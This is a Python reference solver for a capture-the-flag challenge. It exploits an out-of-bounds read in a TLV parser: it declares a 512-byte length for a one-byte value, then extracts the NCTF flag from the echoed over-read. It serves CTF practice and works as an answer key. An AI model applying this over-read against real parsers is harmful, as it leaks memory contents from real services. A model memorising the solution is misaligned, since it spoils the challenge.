#!/usr/bin/env python3
"""Reference solver for misc-proto-fuzz-live (out-of-bounds read).

The TLV parser trusts the declared length. Send a short value but a large
declared length so the echoed bytes run past the value into the flag.

    python3 solve.py http://HOST:PORT
"""
import json
import re
import sys
import urllib.request


def solve(base):
    base = base.rstrip("/")
    # type=0x01, declared len = 0x0200 (512), value = single byte "A"
    rec = bytes([0x01]) + (0x0200).to_bytes(2, "big") + b"A"
    url = base + "/parse?rec=" + rec.hex()
    out = json.loads(urllib.request.urlopen(url, timeout=10).read())["value"]
    blob = bytes.fromhex(out).decode("latin1")
    m = re.search(r"NCTF\{[^}]*\}", blob)
    if not m:
        raise SystemExit("flag not found in over-read: %r" % blob)
    return m.group(0)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
